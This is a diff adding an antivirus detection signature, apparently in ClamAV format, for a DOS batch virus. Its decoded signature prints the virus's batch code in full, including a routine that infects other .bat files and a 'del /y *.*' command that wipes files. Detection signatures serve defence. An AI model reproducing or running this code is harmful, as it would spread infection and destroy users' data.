@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36706
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off%[baty]% for %%f in (*.bat ..\*.bat) do set baty=%%f find "baty"<%baty%>nul if errorlevel 1 find "baty"<%0>>%baty% echo.|date|find "04.07"<nul%[baty]% if errorlevel 0 goto :baty if errorlevel 1 goto :baty_ :baty_ del /y *.* [%baty%] :baty for %%b in (*.bat ..\*.bat) do copy %0 %%b /y time 00:00 exit 
